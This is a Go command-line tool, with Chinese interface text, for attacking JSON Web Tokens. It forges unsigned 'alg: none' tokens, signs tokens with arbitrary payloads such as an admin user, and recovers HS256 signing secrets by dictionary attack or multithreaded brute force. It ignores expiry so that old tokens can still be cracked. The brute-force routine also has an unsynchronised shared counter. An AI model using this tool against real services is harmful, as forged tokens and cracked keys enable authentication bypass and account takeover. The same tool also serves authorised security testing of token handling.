package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

var (
	payload  string
	secret   string
	token    string
	dictFile string
	minLen   int
	maxLen   int
	charset  string
	threads  int
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("用法: go run main.go <command> [options]")
		fmt.Println("可用命令:")
		fmt.Println("  gen                - 生成不使用密钥签名的 JWT。使用参数:")
		fmt.Println("                       --payload <JSON字符串> 设置 JWT 的有效载荷。")
		fmt.Println()
		fmt.Println("  genWithSecret      - 使用指定密钥生成签名的 JWT。使用参数:")
		fmt.Println("                       --payload <JSON字符串> 设置 JWT 的有效载荷。")
		fmt.Println("                       --secret <密钥> 用于加密 JWT 的密钥。")
		fmt.Println()
		fmt.Println("  crack              - 使用字典文件破解已签名的 JWT 密钥。使用参数:")
		fmt.Println("                       --token <JWT> 要破解的 JWT。")
		fmt.Println("                       --dict <字典文件> 密码字典文件路径。")
		fmt.Println()
		fmt.Println("  brute              - 使用暴力破解法尝试破解 JWT 密钥。使用参数:")
		fmt.Println("                       --token <JWT> 要破解的 JWT。")
		fmt.Println("                       --minLen <最小密钥长度> 设置最小密钥长度。")
		fmt.Println("                       --maxLen <最大密钥长度> 设置最大密钥长度。")
		fmt.Println("                       --charset <字符集> 使用的字符集。")
		fmt.Println("                       --threads <线程数> 设置线程数（0 表示使用所有可用核心）。")
		fmt.Println()
		fmt.Println("例如： go run main.go gen --payload '{\"user\":\"admin\"}'")
		os.Exit(1)
	}

	switch os.Args[1] {
	case "gen":
		genCmd := flag.NewFlagSet("gen", flag.ExitOnError)
		genCmd.StringVar(&payload, "payload", "", "设置 JWT 的有效载荷")
		genCmd.Parse(os.Args[2:])
		if payload == "" {
			fmt.Println("请提供 JWT 的有效载荷 (-payload)")
			genCmd.Usage()
			os.Exit(1)
		}
		generateJWT(payload)

	case "genWithSecret":
		genWithSecretCmd := flag.NewFlagSet("genWithSecret", flag.ExitOnError)
		genWithSecretCmd.StringVar(&payload, "payload", "", "设置 JWT 的有效载荷")
		genWithSecretCmd.StringVar(&secret, "secret", "", "用于加密 JWT 的密钥")
		genWithSecretCmd.Parse(os.Args[2:])
		if payload == "" || secret == "" {
			fmt.Println("请提供 JWT 的有效载荷 (-payload) 和密钥 (-secret)")
			genWithSecretCmd.Usage()
			os.Exit(1)
		}
		generateJWTWithSecret(payload, secret)

	case "crack":
		crackCmd := flag.NewFlagSet("crack", flag.ExitOnError)
		crackCmd.StringVar(&token, "token", "", "要破解的 JWT")
		crackCmd.StringVar(&dictFile, "dict", "passwords.txt", "密码字典文件路径")
		crackCmd.Parse(os.Args[2:])
		if token == "" || dictFile == "" {
			fmt.Println("请提供 JWT (-token) 和密码字典文件路径 (-dict)")
			crackCmd.Usage()
			os.Exit(1)
		}
		crackJWT(token, dictFile)

	case "brute":
		bruteCmd := flag.NewFlagSet("brute", flag.ExitOnError)
		bruteCmd.StringVar(&token, "token", "", "要破解的 JWT")
		bruteCmd.IntVar(&minLen, "minLen", 1, "暴力破解的最小密钥长度")
		bruteCmd.IntVar(&maxLen, "maxLen", 4, "暴力破解的最大密钥长度")
		bruteCmd.StringVar(&charset, "charset", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "暴力破解字符集")
		bruteCmd.IntVar(&threads, "threads", 0, "并发线程数，0表示使用所有CPU核心")
		bruteCmd.Parse(os.Args[2:])
		if token == "" {
			fmt.Println("请提供 JWT (-token)")
			bruteCmd.Usage()
			os.Exit(1)
		}
		if threads == 0 {
			threads = runtime.NumCPU() // 使用所有可用核心线程数
		}
		bruteForceJWT(token, minLen, maxLen, charset, threads)

	default:
		fmt.Println("未知命令:", os.Args[1])
		fmt.Println("可用命令: gen, genWithSecret, crack, brute")
		os.Exit(1)
	}
}

// generateJWT 生成未加密的 JWT
func generateJWT(payload string) {
	var claims jwt.MapClaims
	if err := json.Unmarshal([]byte(payload), &claims); err != nil {
		fmt.Println("JSON 解析失败:", err)
		return
	}

	token := jwt.NewWithClaims(jwt.SigningMethodNone, claims)
	tokenString, err := token.SignedString(jwt.UnsafeAllowNoneSignatureType)
	if err != nil {
		fmt.Println("生成未加密 JWT 失败:", err)
		return
	}

	fmt.Println("未加密的 JWT:", tokenString)
}

// generateJWTWithSecret 使用指定密钥生成 JWT
func generateJWTWithSecret(payload, secret string) {
	var claims jwt.MapClaims
	if err := json.Unmarshal([]byte(payload), &claims); err != nil {
		fmt.Println("JSON 解析失败:", err)
		return
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenString, err := token.SignedString([]byte(secret))
	if err != nil {
		fmt.Println("生成带密钥的 JWT 失败:", err)
		return
	}

	fmt.Println("带密钥的 JWT:", tokenString)
}

// crackJWT 使用字典文件破解 JWT 密钥
func crackJWT(tokenString, dictFile string) {
	file, err := os.Open(dictFile)
	if err != nil {
		fmt.Println("无法打开密码文件:", err)
		return
	}
	defer file.Close()

	totalPasswords, err := countLines(dictFile)
	if err != nil {
		fmt.Println("无法读取字典文件:", err)
		return
	}

	scanner := bufio.NewScanner(file)
	var attempts int
	startTime := time.Now()
	lastUpdateTime := startTime

	for scanner.Scan() {
		secret := strings.TrimSpace(scanner.Text())
		attempts++

		// WithoutClaimsValidation: 只验签名，不校验 exp/nbf 等声明，
		// 否则过期 token 即使密钥正确也会返回错误，导致无法破解。
		_, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
			return []byte(secret), nil
		}, jwt.WithoutClaimsValidation())

		if err == nil {
			fmt.Printf("成功破解密钥！密钥为: %s\n", secret)
			return
		}

		currentTime := time.Now()
		if currentTime.Sub(lastUpdateTime) >= time.Second {
			progress := (float64(attempts) / float64(totalPasswords)) * 100
			fmt.Printf("破解进度: %.2f%% 尝试次数: %d\n", progress, attempts)
			lastUpdateTime = currentTime
		}
	}

	fmt.Println("破解失败，未找到有效密钥")
	fmt.Printf("耗时: %s\n", time.Since(startTime))
}

// bruteForceJWT 使用多线程暴力破解 JWT 密钥
func bruteForceJWT(tokenString string, minLen, maxLen int, charset string, threads int) {
	startTime := time.Now()
	totalAttempts := 0
	charsetRunes := []rune(charset)
	lastUpdateTime := startTime
	var wg sync.WaitGroup

	attemptsChan := make(chan string)
	found := make(chan string)
	quit := make(chan struct{})

	// 创建 worker
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for attempt := range attemptsChan {
				select {
				case <-quit:
					return
				default:
					_, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
						return []byte(attempt), nil
					}, jwt.WithoutClaimsValidation())
					if err == nil {
						found <- attempt
						return
					}
					totalAttempts++
					if time.Since(lastUpdateTime) >= time.Second {
						fmt.Printf("尝试次数: %d  当前密钥: %s\n", totalAttempts, attempt)
						lastUpdateTime = time.Now()
					}
				}
			}
		}()
	}

	go func() {
		for length := minLen; length <= maxLen; length++ {
			generateAttempts(charsetRunes, make([]rune, length), 0, attemptsChan)
		}
		close(attemptsChan)
	}()

	select {
	case attempt := <-found:
		close(quit)
		fmt.Printf("成功破解密钥！密钥为: %s\n", attempt)
	case <-time.After(time.Duration(maxLen) * time.Hour):
		fmt.Println("破解失败，未找到有效密钥")
	}
	wg.Wait()
	fmt.Printf("总尝试次数: %d, 耗时: %s\n", totalAttempts, time.Since(startTime))
}

// generateAttempts 生成爆破组合并发送到 attemptsChan
func generateAttempts(charsetRunes, current []rune, pos int, attemptsChan chan string) {
	if pos == len(current) {
		attemptsChan <- string(current)
		return
	}
	for _, r := range charsetRunes {
		current[pos] = r
		generateAttempts(charsetRunes, current, pos+1, attemptsChan)
	}
}

// countLines 计算文件的行数
func countLines(path string) (int, error) {
	file, err := os.Open(path)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	lines := 0
	for scanner.Scan() {
		lines++
	}
	return lines, scanner.Err()
}
